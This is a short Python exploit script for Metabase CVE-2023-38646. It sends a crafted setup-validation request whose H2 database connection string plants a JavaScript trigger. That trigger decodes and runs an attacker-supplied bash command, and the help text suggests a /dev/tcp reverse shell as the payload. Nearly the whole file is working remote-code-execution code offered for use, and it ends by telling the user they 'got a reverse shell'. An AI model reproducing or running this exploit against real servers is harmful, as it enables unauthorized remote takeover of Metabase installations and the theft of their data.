'''
Metabase CVE-2023-38646
'''


import sys
import requests
import base64
import json

help = """
python3 exploit.py {url} {setup-token} {payload}

url - metabase website
setup-token - setup-token value from {url}/api/session/properties
payload - reverse shell payload. "bash -i >& /dev/tcp/0.0.0.0/1234 0>&1"
"""

try:
    url = sys.argv[1]
    token = sys.argv[2]
    payload = sys.argv[3]
except:
    print(help)
    exit()

if url[-1] == "/":
    post_url = url + "api/setup/validate"
else:
    post_url = url + "/api/setup/validate"

bytes_payload = payload.encode("UTF-8")
base64_payload = base64.b64encode(bytes_payload).replace(b'=', b'K').decode('UTF-8')

data = '''{"token": "''' + token + '''","details":{"is_on_demand": false,"is_full_sync": false,"is_sample": false,"cache_ttl": null,"refingerprint": false,"auto_run_queries": true,"schedules":{},"details":{"db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('bash -c {echo,''' + str(base64_payload) + '''}|{base64,-d}|{bash,-i}')\\n$$--=x","advanced-options": false,"ssl": true},"name": "an-sec-research-team","engine": "h2"}}'''

headers = {'Content-type': 'application/json'}
try:
    response = requests.post(post_url, data=data, headers=headers)
    if "message" in str(response.content):
        print("post request successfully sent you got a reverse shell =)")
    else:
        print("something went wrong ;-;")
except:
    print("something went wrong ;-;")